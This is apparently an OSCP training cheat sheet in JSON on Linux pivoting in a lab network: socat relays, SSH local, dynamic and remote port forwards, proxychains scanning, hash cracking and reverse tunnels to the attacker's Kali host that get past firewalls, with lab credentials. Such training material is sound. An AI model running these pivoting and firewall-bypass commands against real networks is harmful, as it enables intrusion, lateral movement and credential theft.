{
  "cheatsheets": [
    {
      "id": "ssh-tunneling-linux",
      "name": "SSH Tunneling - Linux Pivot Techniques",
      "description": "Master port forwarding and SSH tunneling through Linux pivot points to traverse network boundaries and bypass firewalls in OSCP environments",
      "educational_header": {
        "how_to_recognize": [
          "Compromised Linux host with multiple network interfaces (ip addr shows ens192, ens224)",
          "Database/service credentials found but no client tools installed on compromised host",
          "Firewall blocking direct access to internal services from attack machine",
          "SSH client available on compromised host (which ssh returns /usr/bin/ssh)",
          "Need to access multiple internal services through single pivot point",
          "Segmented network with DMZ hosts straddling WAN and internal subnets"
        ],
        "when_to_look_for": [
          "After gaining initial foothold on perimeter host with limited tooling",
          "When nmap shows compromised host has multiple IPs in different subnets",
          "When credentials found but corresponding service not directly accessible",
          "Need to pivot deeper into network through intermediate jump host",
          "Firewall allows outbound SSH but blocks inbound connections to pivot host",
          "Enumerating complex internal networks with 10+ services across multiple hosts"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Socat Port Forward - PostgreSQL Access Through DMZ Host",
          "context": "Target: Confluence server (CONFLUENCE01) with RCE vulnerability (CVE-2022-26134), dual-homed (WAN: 192.168.50.63, DMZ: 10.4.50.63). Found PostgreSQL credentials in /var/atlassian/confluence.cfg.xml pointing to PGDATABASE01 (10.4.50.215:5432). No psql client on CONFLUENCE01. No firewall between Kali and CONFLUENCE01. Socat installed. Goal: Query PostgreSQL from Kali machine.\n\nNetwork Topology:\n┌─────────────┐          ┌──────────────┐          ┌──────────────┐\n│    Kali     │────WAN───│ CONFLUENCE01 │───DMZ────│ PGDATABASE01 │\n│ 192.168.x.4 │          │ 192.168.50.63│          │ 10.4.50.215  │\n└─────────────┘          │ 10.4.50.63   │          │    Port 5432 │\n                         │  Port 2345   │          └──────────────┘\n                         └──────────────┘",
          "approach": "Step 1: Verify Socat availability:\n  which socat. \nStep 2: Listen on CONFLUENCE01 WAN interface port 2345, forward to PGDATABASE01:5432:\n  socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432. \nStep 3: From Kali, connect to forwarded port:\n  psql -h 192.168.50.63 -p 2345 -U postgres (password: D@t4basePassw0rd!). \nStep 4: Enumerate databases: \\l. \nStep 5: Query confluence database: \\c confluence; select * from cwd_user; \nStep 6: Extract password hashes, crack with Hashcat:\n  hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt. Traffic Flow: Kali:psql → CONFLUENCE01:2345 (Socat listens) → PGDATABASE01:5432 (PostgreSQL).",
          "commands": [
            "socat-port-forward",
            "psql-connect"
          ],
          "expected_outcome": "Socat verbose output shows 'listening on AF=2 0.0.0.0:2345'. psql connects successfully, lists 4 databases (confluence, postgres, template0, template1). Query cwd_user table reveals Atlassian PBKDF2-HMAC-SHA1 password hashes. Hashcat cracks database_admin:sqlpass123, hr_admin:Welcome1234, rdp_admin:P@ssw0rd! within 5 minutes using fasttrack.txt.\n\nTime: 2-3 minutes for setup, 3-5 minutes for hash cracking.\n\nLimitation: One socket per Socat process - need new process for each port.\n\nAlternative: If Socat unavailable, use iptables (requires root): iptables -t nat -A PREROUTING -p tcp --dport 2345 -j DNAT --to-destination 10.4.50.215:5432, or Netcat + FIFO pipe: mkfifo /tmp/pipe; nc -l -p 2345 < /tmp/pipe | nc 10.4.50.215 5432 > /tmp/pipe.",
          "why_this_works": "Socat creates bidirectional byte stream relay between two sockets. TCP-LISTEN:2345,fork opens listening socket on all interfaces (0.0.0.0:2345), fork creates new subprocess for each connection (prevents single-connection death). TCP:10.4.50.215:5432 defines destination socket. All packets received on listening port forwarded to destination. No firewall between Kali→CONFLUENCE01 allows binding on WAN interface. CONFLUENCE01 can route to DMZ subnet (10.4.50.0/24) per ip route output showing 'dev ens224 proto kernel scope link src 10.4.50.63'.\n\nResult: Transparent relay - psql on Kali behaves as if directly connected to PGDATABASE01."
        },
        {
          "title": "Scenario 2: SSH Local Port Forward - Multi-Hop SMB Access",
          "context": "Target: CONFLUENCE01 (dual-homed), PGDATABASE01 (SSH running, database_admin:sqlpass123 credentials from cracked hashes), HRSHARES (172.16.50.217:445 SMB). PGDATABASE01 has 3 interfaces (DMZ: 10.4.50.215, Internal: 172.16.50.215, Management: ens256 down). HRSHARES only accessible from PGDATABASE01 internal network, not from CONFLUENCE01. No firewall on CONFLUENCE01 WAN interface. Goal: Access SMB share on HRSHARES from Kali.\n\nNetwork Topology:\n┌──────┐      ┌────────────┐      ┌──────────────┐      ┌──────────┐\n│ Kali │──WAN─│CONFLUENCE01│──DMZ─│ PGDATABASE01 │──Int─│ HRSHARES │\n└──────┘      │192.168.50.63      │ 10.4.50.215  │      │172.16.x  │\n              │Port 4455  │      │172.16.50.215 │      │Port 445  │\n              └───────────┘      └──────────────┘      └──────────┘\n                   ↑                    ↓\n                   └──SSH Tunnel────────┘",
          "approach": "Step 1: From CONFLUENCE01 reverse shell, spawn TTY:\n  python3 -c 'import pty; pty.spawn(\"/bin/sh\")'. \nStep 2: Enumerate PGDATABASE01 interfaces:\n  ssh database_admin@10.4.50.215 (password: sqlpass123), run ip addr (confirms 172.16.50.215 interface). \nStep 3: Discover HRSHARES:\n  for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done (finds 172.16.50.217:445 open). \nStep 4: Exit SSH, create local port forward:\n  ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215. \nStep 5: Verify listening on CONFLUENCE01:\n  ss -ntplu | grep 4455 (shows 0.0.0.0:4455). \nStep 6: From Kali, connect through forward:\n  smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234. \nStep 7: Access scripts share:\n  smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234, download files: get Provisioning.ps1. Traffic: Kali → CONFLUENCE01:4455 (SSH client listens) → SSH tunnel → PGDATABASE01 (SSH server forwards) → HRSHARES:445.",
          "commands": [
            "ssh-local-port-forward",
            "smbclient-list-shares"
          ],
          "expected_outcome": "SSH connects without output (-N flag suppresses shell). ss shows tcp LISTEN 0 128 0.0.0.0:4455 0.0.0.0:*. smbclient lists 5 shares: ADMIN$, C$, IPC$, scripts, Users. scripts share contains Provisioning.ps1 (387 bytes) and README.txt (145 bytes). Files download directly to Kali /home/kali directory.\n\nTime: 3-4 minutes.\n\nLimitation: One socket per -L flag - targeting multiple ports requires multiple -L flags in one SSH command (e.g., -L 4455:172.16.50.217:445 -L 3390:172.16.50.217:3389) or separate SSH sessions.\n\n\n\nAlternative: If SSH unavailable, chain Socat processes: On CONFLUENCE01: socat TCP-LISTEN:4455,fork TCP:10.4.50.215:8888.\n\n On PGDATABASE01: socat TCP-LISTEN:8888,fork TCP:172.16.50.217:445.\n\n Or use netcat relays with FIFOs.",
          "why_this_works": "SSH -L creates local port forward. Syntax: -L [bind_address:]port:host:hostport. Listening socket (0.0.0.0:4455) bound by SSH client on CONFLUENCE01. Packets received on this port pushed through encrypted SSH tunnel to PGDATABASE01 SSH server.\n\nSSH server on PGDATABASE01 forwards packets to specified destination (172.16.50.217:445). PGDATABASE01 can route to 172.16.50.0/24 subnet per ip route showing 'dev ens224 proto kernel scope link src 172.16.50.215'.\n\nMulti-hop chain: Kali→CONFLUENCE01 (direct TCP connection)→PGDATABASE01 (SSH tunnel encryption)→HRSHARES (destination forwarding).\n\nSSH encrypts all traffic between CONFLUENCE01 and PGDATABASE01, hiding SMB protocol from network inspection."
        },
        {
          "title": "Scenario 3: SSH Dynamic Port Forward - SOCKS Proxy Multi-Target Enumeration",
          "context": "Target: Need to enumerate entire 172.16.50.0/24 subnet from Kali machine. Only have SSH access to PGDATABASE01 (database_admin:sqlpass123 credentials). Multiple services need testing (SMB:445, HTTP:80, RDP:3389, etc.) across multiple hosts. SSH local port forward would require separate tunnel per socket. Nmap not installed on PGDATABASE01. Goal: Flexible access to any host:port in internal subnet via single SOCKS tunnel.\n\nNetwork Topology:\n┌──────┐      ┌────────────┐      ┌──────────────┐      ┌─────────────┐\n│ Kali │──WAN─│CONFLUENCE01│──DMZ─│ PGDATABASE01 │──Int─│172.16.50.0/24│\n└──────┘      │Port 9999   │      │ (SSH server) │      │  Subnet     │\n     ↓        └────────────┘      └──────────────┘      │ HRSHARES    │\nProxychains         ↑                    ↓               │ MULTISERVER │\n     ↓              └──SSH SOCKS Tunnel──┘               └─────────────┘\n  Nmap/smbclient → SOCKS packets → Any addressable socket",
          "approach": "Step 1: From CONFLUENCE01, spawn TTY:\n  python3 -c 'import pty; pty.spawn(\"/bin/sh\")'. \nStep 2: Create SSH dynamic port forward:\n  ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215. \nStep 3: Verify SOCKS port:\n  ss -ntplu | grep 9999 (shows 0.0.0.0:9999). \nStep 4: On Kali, configure Proxychains: Edit /etc/proxychains4.conf, replace proxy list with 'socks5 192.168.50.63 9999'. \nStep 5: Optimize scan speed: Edit same file, set 'tcp_read_time_out = 1000' and 'tcp_connect_time_out = 1000' (default 4000ms too slow). \nStep 6: Port scan through SOCKS:\n  sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217 (requires sudo for raw sockets). \nStep 7: Access discovered SMB:\n  proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234. \nStep 8: Multiple targets:\n  proxychains nmap -sT -p445 -Pn 172.16.50.0/24 (sweep entire subnet for SMB). Traffic: Kali tool → Proxychains (LD_PRELOAD hooks libc) → SOCKS5 packets → CONFLUENCE01:9999 → SSH tunnel → PGDATABASE01 → Destination.",
          "commands": [
            "ssh-dynamic-port-forward",
            "proxychains-config",
            "proxychains-nmap"
          ],
          "expected_outcome": "SSH creates SOCKS5 proxy on port 9999 (netstat shows 'tcp 0 0 0.0.0.0:9999 0.0.0.0:* LISTEN'). Proxychains output shows '[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:445 ... OK'. Nmap scan returns ports 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds), 3389 (ms-wbt-server) open on HRSHARES. smbclient lists 5 shares through SOCKS proxy. Scan time: 3-5 minutes for 20 ports on single host (TCP connect scan slower through SOCKS). Full /24 sweep: 10-15 minutes.\n\nSuccess rate: Works with dynamically-linked binaries (nmap, curl, smbclient, psql). Fails with statically-linked binaries (golang tools).\n\nLimitation: TCP-only (no UDP/ICMP), DNS resolution inside tunnel (use -n flag for Nmap).\n\nAlternative: If proxychains incompatible, use redsocks (transparent TCP proxy), tsocks (older SOCKS wrapper), or sshuttle -r user@pivot 172.16.50.0/24 (requires root on Kali, Python3 on PGDATABASE01).",
          "why_this_works": "SSH -D creates SOCKS proxy server on SSH client (CONFLUENCE01).\n\nSOCKS (Socket Secure) protocol wraps packets with destination address headers. Syntax: client → SOCKS proxy: [SOCKS CONNECT host:port] + [payload].\n\nSSH client (CONFLUENCE01) receives SOCKS packets on port 9999, pushes through encrypted tunnel to SSH server (PGDATABASE01).\n\nSSH server unwraps SOCKS headers, extracts destination address, forwards packets to addressed socket. Proxychains intercepts libc networking functions (connect(), send(), recv()) via LD_PRELOAD environment variable hack, transparently wraps all network calls in SOCKS protocol before sending.\n\nResult: Any socket PGDATABASE01 can route to becomes accessible from Kali through single tunnel. Single tunnel serves multiple concurrent connections (unlike SSH local forward's one-port limitation)."
        },
        {
          "title": "Scenario 4: SSH Remote Port Forward - Bypass Perimeter Firewall",
          "context": "Target: Perimeter firewall now active on CONFLUENCE01. Only TCP/8090 (Confluence web app) allowed inbound to CONFLUENCE01 WAN interface. Cannot bind listening ports on CONFLUENCE01 WAN interface and connect from Kali (previous Socat/SSH local techniques blocked). Still need access to PGDATABASE01 PostgreSQL (10.4.50.215:5432) from Kali. CONFLUENCE01 can SSH outbound to Kali machine (outbound connections allowed). Kali SSH server running. Goal: Access PostgreSQL from Kali despite inbound firewall blocking all ports except 8090.\n\nFirewall Topology:\n┌──────┐      ╔═══FIREWALL═══╗      ┌────────────┐      ┌──────────────┐\n│ Kali │──WAN─║ Only 8090 IN ║──WAN─│CONFLUENCE01│──DMZ─│ PGDATABASE01 │\n└──────┘      ║ All OUT OK   ║      └────────────┘      │ Port 5432    │\n   ↑          ╚══════════════╝            ↓              └──────────────┘\n   │                                      │\n   └───SSH connection (CONFLUENCE01 initiates)───┘\n        Port 2345 bound on Kali loopback",
          "approach": "Step 1: Enable Kali SSH server:\n  sudo systemctl start ssh, check status: sudo systemctl status ssh (should show 'active (running)'). \nStep 2: Set strong Kali password:\n  passwd kali (SSH requires password or key auth). \nStep 3: Enable password auth:\n  sudo nano /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh. \nStep 4: From CONFLUENCE01 reverse shell, spawn TTY:\n  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'. \nStep 5: Initiate reverse tunnel:\n  ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 (enter Kali password). \nStep 6: On Kali, verify listening port:\n  ss -ntplu | grep 2345 (shows tcp LISTEN 0 128 127.0.0.1:2345 0.0.0.0:*). \nStep 7: Connect from Kali loopback:\n  psql -h 127.0.0.1 -p 2345 -U postgres (password: D@t4basePassw0rd!). \nStep 8: Query database: \\l, \\c confluence, select * from cwd_user;. Traffic: Kali loopback:2345 → SSH tunnel (reverse direction) → CONFLUENCE01 → PGDATABASE01:5432. Firewall allows: CONFLUENCE01 → Kali:22 (outbound SSH). Firewall blocks: Kali → CONFLUENCE01:2345 (but not needed - port on Kali side).",
          "commands": [
            "systemctl-start-ssh",
            "ssh-remote-port-forward",
            "psql-connect"
          ],
          "expected_outcome": "SSH connection from CONFLUENCE01 to Kali succeeds (outbound SSH allowed). No immediate output after password entry (-N flag prevents shell). Port 2345 bound on Kali loopback only (127.0.0.1, not all interfaces). ss shows 'Recv-Q: 0, Send-Q: 128, Local: 127.0.0.1:2345, State: LISTEN'. psql connects to localhost:2345, successfully queries PostgreSQL on PGDATABASE01. Lists 4 databases, queries confluence database user table.\n\nTime: 2-3 minutes for setup.\n\nLimitation: Listening socket bound to loopback (127.0.0.1) only - cannot access from other machines on Kali's network. To bind all interfaces (0.0.0.0), SSH server must allow GatewayPorts: Edit Kali /etc/ssh/sshd_config, add 'GatewayPorts yes', restart sshd. Security note: GatewayPorts in hostile network allows anyone to connect to forwarded port.\n\nAlternative: If SSH blocked outbound, use DNS tunneling (iodine, dnscat2), ICMP tunneling (ptunnel), or HTTP tunneling (chisel, ngrok).",
          "why_this_works": "SSH -R reverses port forwarding direction compared to -L.\n\nSSH client (CONFLUENCE01) initiates connection to SSH server (Kali).\n\nSSH server binds listening socket (127.0.0.1:2345) locally. Packets sent to Kali:2345 pushed through SSH tunnel back to SSH client (CONFLUENCE01).\n\nSSH client on CONFLUENCE01 forwards packets to specified destination (10.4.50.215:5432).\n\nFirewall allows outbound SSH from CONFLUENCE01 (administrative traffic, rarely blocked).\n\nFirewall blocks inbound connections to CONFLUENCE01 non-standard ports.\n\nResult: Firewall bypassed by reversing connection direction. Listening port on attacker-controlled machine (Kali), forwarding through compromised host (CONFLUENCE01) acting as tunnel endpoint.\n\nClassic 'reverse tunnel' or 'reverse port forward' technique essential for restrictive firewalled environments."
        },
        {
          "title": "Scenario 5: SSH Remote Dynamic Port Forward - Reverse SOCKS Through Firewall",
          "context": "Target: MULTISERVER03 (Windows) discovered on DMZ (10.4.50.64). Need to enumerate ports 80, 135, 3389, and scan range 9050-9100. Firewall blocks all inbound to CONFLUENCE01 except TCP/8090. SSH local/dynamic forward won't work (can't bind CONFLUENCE01 WAN interface accessible from Kali). Need flexible multi-port access through firewall restriction. CONFLUENCE01 has OpenSSH 7.6+ client (required for remote dynamic). Kali SSH server running. Goal: SOCKS proxy on Kali machine, tunneled through reverse SSH connection initiated from firewalled CONFLUENCE01.\n\nFirewall + Reverse SOCKS Topology:\n┌──────┐      ╔═══FIREWALL═══╗      ┌────────────┐      ┌──────────────┐\n│ Kali │      ║ Inbound: 8090║      │CONFLUENCE01│──DMZ─│ MULTISERVER03│\n│      │──WAN─║ Outbound: All║──WAN─│            │      │ 10.4.50.64   │\n└──────┘      ╚══════════════╝      └────────────┘      │ Ports 80-9100│\n   ↑                                      ↓              └──────────────┘\n   │ Port 9998                            │\n   │ SOCKS5 Proxy         SSH connection │\n   │ (bound on Kali)      (CONFLUENCE01 → Kali)\n   └──────────────────────────────────────┘\nProxychains → Kali:9998 → Tunnel → CONFLUENCE01 → Any socket",
          "approach": "Step 1: Verify OpenSSH version on CONFLUENCE01:\n  ssh -V (needs ≥7.6 for remote dynamic, output: 'OpenSSH_8.2p1 Ubuntu'). \nStep 2: From CONFLUENCE01, spawn TTY:\n  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'. \nStep 3: Create remote dynamic forward:\n  ssh -N -R 9998 kali@192.168.118.4 (Note: Only port specified, no destination socket - this creates SOCKS proxy). \nStep 4: On Kali, verify SOCKS proxy:\n  ss -ntplu | grep 9998 (shows tcp LISTEN 0 128 127.0.0.1:9998, tcp LISTEN 0 128 [::1]:9998 - bound on both IPv4 and IPv6 loopback). \nStep 5: Configure Proxychains: Edit /etc/proxychains4.conf, replace proxy list with 'socks5 127.0.0.1 9998'. \nStep 6: Optimize timeouts: Same file, set 'tcp_read_time_out = 1000', 'tcp_connect_time_out = 1000'. \nStep 7: Scan MULTISERVER03:\n  sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64 (scans from Kali through reverse SOCKS). \nStep 8: Scan specific range:\n  sudo proxychains nmap -vvv -sT -p9050-9100 -Pn -n 10.4.50.64. \nStep 9: Access discovered service:\n  proxychains curl http://10.4.50.64:9091 or proxychains xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:10.4.50.64. Traffic: Kali tool → Proxychains (SOCKS wrapper) → Kali loopback:9998 (SOCKS proxy) → SSH tunnel (reverse direction) → CONFLUENCE01 (SSH client forwards) → Any socket CONFLUENCE01 can reach.",
          "commands": [
            "ssh-remote-dynamic-port-forward",
            "proxychains-config",
            "proxychains-nmap"
          ],
          "expected_outcome": "SSH connection from CONFLUENCE01 to Kali succeeds, no output (-N flag). ss on Kali shows SOCKS5 proxy bound on loopback (both IPv4 127.0.0.1:9998 and IPv6 [::1]:9998).\n\n Proxychains output: '[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:80 ... OK', '[proxychains] ... 10.4.50.64:135 ... OK', '[proxychains] ... 10.4.50.64:3389 ... OK'. Nmap scan identifies open ports: 80 (http), 135 (msrpc), 3389 (ms-wbt-server) on MULTISERVER03. Port range scan 9050-9100 finds port 9091 open. curl retrieves HTTP content from internal web service.\n\nTime: 5-7 minutes (including scan time). Scan slower through SOCKS (Windows firewall responds differently than Linux to closed ports, increasing timeout hits).\n\nAlternative: If OpenSSH <7.6 on CONFLUENCE01, use SSH remote port forward (-R) + standalone SOCKS server: Install microsocks on CONFLUENCE01 (lightweight SOCKS5 server), forward to its port: ssh -N -R 9998:127.0.0.1:1080 kali@192.168.118.4 (microsocks listening on CONFLUENCE01:1080). Or use SSH remote forward + redsocks transparent proxy.",
          "why_this_works": "SSH -R 9998 (without destination socket) creates remote dynamic port forward (OpenSSH ≥7.6 feature, added October 2017). Syntax difference: Remote port forward: -R [bind_address:]port:host:hostport. Remote dynamic: -R [bind_address:]port (no host:hostport).\n\nSSH server (Kali) binds SOCKS proxy port (9998) on loopback.\n\nSSH client (CONFLUENCE01) acts as forwarding endpoint. Packets sent to Kali:9998 must be SOCKS-formatted (Proxychains provides this).\n\nSOCKS packets contain destination address in protocol header.\n\nSSH server (Kali) wraps SOCKS packets, pushes through reverse SSH tunnel to client.\n\nSSH client (CONFLUENCE01) unwraps, extracts destination from SOCKS header, forwards to addressed socket. Combines benefits: Remote port forward (firewall bypass via reverse connection) + Dynamic forward (SOCKS multi-socket flexibility).\n\nResult: Full internal network access from Kali via reverse tunnel through firewall-protected pivot host. Only requires outbound SSH (port 22) allowed from CONFLUENCE01, which is common in corporate environments for administrative purposes."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Network Reconnaissance & Topology Mapping",
          "notes": "Before port forwarding, understand network layout.\n\nCritical enumeration: (1) Compromised host interfaces: ip addr (identifies network attachment points), (2) Routing table: ip route (shows reachable subnets), (3) Listening services: ss -ntplu or netstat -tuln (discovers what's already listening, avoid port conflicts), (4) Available tools: which socat ssh nc python python3 (determines technique options), (5) Firewall rules if observable: iptables -L (if permissions allow), check /var/log/syslog for firewall messages. Document findings: Create network diagram showing subnets, interfaces, routing paths, firewall restrictions, compromised host positions. Identify pivot points (dual-homed hosts), enumerate accessible subnets from each interface.\n\nTime estimate: 5-10 minutes for thorough enumeration.\n\nOSCP tip: Screenshot ip addr and ip route output for reporting, include in network diagrams.",
          "commands": [
            "ip-addr",
            "ip-route",
            "ss-listening-ports"
          ]
        },
        {
          "title": "Phase 2: Outbound Port Forwarding (Permissive Firewall Environment)",
          "notes": "Use when no inbound firewall restrictions exist on pivot host WAN interface.\n\nProgression from simple to flexible: Socat (simplest, one port, no encryption), SSH Local -L (encrypted, one port per flag, requires credentials), SSH Dynamic -D (encrypted, SOCKS proxy for unlimited ports, requires credentials). Socat syntax: socat -ddd TCP-LISTEN:PORT,fork TCP:DEST_IP:DEST_PORT. SSH Local syntax: ssh -N -L [bind_addr:]listen_port:dest_ip:dest_port user@ssh_server. SSH Dynamic syntax: ssh -N -D [bind_addr:]listen_port user@ssh_server.\n\nTesting: Verify listening port: ss -ntplu | grep PORT. Test connectivity: telnet pivot_ip pivot_port or nc -zv pivot_ip pivot_port. From Kali, connect to forwarded port as if directly accessing internal service.\n\nUse case progression: Start with Socat for quick single-service access, escalate to SSH Local when encryption needed or multiple single-port forwards, use SSH Dynamic for full subnet enumeration (combine with Proxychains + Nmap).\n\nTime estimates: Socat setup 2-3 min, SSH Local 3-4 min, SSH Dynamic 4-5 min.\n\nOSCP relevance: HIGH - Foundational techniques, work in 60% of lab scenarios with permissive firewalls.",
          "commands": [
            "socat-port-forward",
            "ssh-local-port-forward",
            "ssh-dynamic-port-forward",
            "ss-listening-ports"
          ]
        },
        {
          "title": "Phase 3: Reverse Tunneling (Inbound Firewall Restrictions)",
          "notes": "Use when inbound connections to pivot host blocked by perimeter firewall. Key concept: Reverse the connection direction - pivot host initiates SSH to attacker-controlled SSH server. Listening port binds on Kali machine, forwarding done through tunnel.\n\nPrerequisites: (1) Kali SSH server running: sudo systemctl start ssh, verify: sudo systemctl status ssh (shows active). (2) Strong password set: passwd kali (or use SSH keys for better security). (3) Password authentication enabled: Edit /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh. Techniques: SSH Remote -R (one port, syntax: ssh -N -R [bind_addr:]listen_port:dest_ip:dest_port user@kali_ip), SSH Remote Dynamic -R (SOCKS proxy, syntax: ssh -N -R [bind_addr:]listen_port user@kali_ip - note no destination). Verification: On Kali, check listening: ss -ntplu | grep PORT (default binds to 127.0.0.1 loopback only). For all-interfaces binding: Enable GatewayPorts in Kali /etc/ssh/sshd_config: 'GatewayPorts yes', restart sshd. Security warning: GatewayPorts in hostile networks allows anyone on Kali's network to access forwarded ports - use with caution, bind to specific IPs when possible.\n\nTroubleshooting: (1) 'Connection refused' when CONFLUENCE01 → Kali:22 → Check Kali SSH server running, verify firewall allows TCP/22 inbound. (2) 'Permission denied (publickey)' → Password auth not enabled, check PasswordAuthentication. (3) 'Address already in use' → Port conflict on Kali, choose different port.\n\nTime estimates: SSH Remote setup 5-7 min (including SSH server setup), SSH Remote Dynamic 6-8 min.\n\nOSCP relevance: CRITICAL - Exam environments frequently have perimeter firewalls, reverse tunneling is primary bypass technique. Success rate: 80% of firewalled scenarios.",
          "commands": [
            "systemctl-start-ssh",
            "ssh-remote-port-forward",
            "ssh-remote-dynamic-port-forward",
            "ss-listening-ports"
          ]
        },
        {
          "title": "Phase 4: Advanced Techniques & Troubleshooting",
          "notes": "sshuttle - VPN-like transparent routing for complex scenarios: Requires root on Kali (for routing table modifications), Python3 on pivot host (executes Python forwarding code). Usage: sshuttle -r user@pivot_ip SUBNET1 SUBNET2 (e.g., sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24). Benefits: No need for Proxychains, traffic routes transparently, works with any tool. Limitations: Requires direct SSH access to pivot, can't chain through multiple hops without nested sshuttle.\n\nTroubleshooting common issues: (1) 'Connection refused' → Verify port listening with ss/netstat, check firewall rules with iptables -L or netsh advfirewall show currentprofile, test with telnet or nc. (2) 'Permission denied (publickey)' → SSH key auth failed, try password auth (-o PreferredAuthentications=password), check /var/log/auth.log on SSH server for detailed error. (3) 'Cannot bind port' → Port number <1024 requires root privileges, or port already in use (check with ss -ntplu). (4) Slow SOCKS performance → Reduce Proxychains timeouts: Edit /etc/proxychains4.conf, set tcp_read_time_out=1000, tcp_connect_time_out=1000 (default 4000ms too high for internal networks). (5) 'Static binary' error with Proxychains → Binary statically linked, LD_PRELOAD hook fails. Solution: Use tools with native SOCKS support (curl --socks5), or recompile dynamically, or use alternative tunnel (sshuttle, redsocks). (6) DNS resolution through tunnel → Proxychains uses proxy_dns in config (enabled by default), but Nmap needs -n flag to skip DNS entirely.\n\nPerformance optimization: For large port scans through SOCKS, reduce Nmap timing: -T2 (polite, slower but more reliable through tunnel), avoid -T4/-T5 (aggressive, causes timeouts).\n\nSSH connection persistence: Use ControlMaster for connection reuse: ssh -M -S /tmp/ssh-socket -N -D 9999 user@pivot, reuse with ssh -S /tmp/ssh-socket user@pivot (avoids reauthentication).\n\nTime estimates: sshuttle setup 3-4 min, troubleshooting varies 5-30 min depending on issue complexity.\n\nOSCP relevance: HIGH - Exam troubleshooting skills, understanding failure modes critical for time management.",
          "commands": [
            "sshuttle-vpn",
            "ssh-debug-verbose",
            "proxychains-config"
          ]
        }
      ],
      "tags": [
        "SSH",
        "TUNNELING",
        "PIVOTING",
        "OSCP:HIGH",
        "LINUX",
        "SOCKS",
        "PORT_FORWARDING",
        "FIREWALL_BYPASS",
        "SOCAT",
        "PROXYCHAINS",
        "REVERSE_TUNNEL"
      ]
    }
  ]
}
